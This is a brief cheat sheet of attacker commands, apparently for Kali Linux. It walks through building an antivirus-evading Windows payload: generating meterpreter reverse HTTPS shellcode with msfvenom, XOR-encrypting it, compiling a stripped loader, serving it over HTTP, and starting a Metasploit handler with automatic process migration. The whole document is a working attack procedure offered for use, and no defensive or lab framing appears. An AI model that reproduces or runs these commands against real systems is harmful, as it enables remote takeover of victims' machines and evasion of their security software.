# Kali Attacker Commands

## 1. Generate Shellcode
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=YOUR_LHOST LPORT=YOUR_PORT -f raw -o shellcode.bin
```

## 2. Encrypt Shellcode
```bash
python3 encrypt.py
```

## 3. Verify Encryption
```bash
python3 -c "
key = YOUR_KEY
with open('encrypted_shell.bin','rb') as f:
    enc = f.read()
dec = bytes([b ^ key for b in enc])
with open('shellcode.bin','rb') as f:
    orig = f.read()
print('Match:', dec == orig)
"
```

SOULD OUTPUT: Match: True.

## 4. Compile Loader
```bash
x86_64-w64-mingw32-gcc loader.c -o OUTPUT_NAME.exe -mwindows -O2 -fvisibility=hidden -s -Wl,--strip-all -lkernel32 -lntdll
```

## 5. Serve Files
```bash
cd ~/AV-evader-payload && python3 -m http.server 8080
```

## 6. Start Listener
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_https; set LHOST YOUR_LHOST; set LPORT YOUR_PORT; set ExitOnSession false; set AutoRunScript post/windows/manage/migrate; run"
```